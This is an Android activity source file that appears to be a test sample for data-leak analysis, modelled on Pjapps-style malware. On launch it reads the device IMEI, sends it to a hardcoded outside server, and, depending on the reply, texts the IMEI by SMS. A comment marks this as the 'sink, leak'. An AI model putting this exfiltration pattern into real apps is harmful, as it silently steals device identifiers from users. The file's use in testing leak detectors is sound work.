package fu.hao.pjapps;

import android.content.Context;
import android.app.Activity;
import android.os.Bundle;
import android.telephony.SmsManager;
import android.telephony.TelephonyManager;

public class MainActivity extends Activity {

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

        TelephonyManager telephonyManager = (TelephonyManager) getSystemService(Context.TELEPHONY_SERVICE);
        String imei = telephonyManager.getDeviceId();
       // String str2 = "http://" + Base64.encodebook("2maodb3ialke8mdeme3gkos9g1icaofm", 6, 3) + "/mm.do?imei=" + imei;
        String str2 = "http://mobilemeego91.com" + "/mm.do?imei=" + imei;
        try {
            str2 = BaseAuthenicationHttpClient.getStringByURL(str2);
            if (str2 != null && !"".equals(str2)) {
                if ("no".equalsIgnoreCase(str2)) {
                    SmsManager sms = SmsManager.getDefault();
                    sms.sendTextMessage("+49", null, imei, null, null);  //sink, leak
                }
            }
        } catch (Exception e) {

        }
    }
}
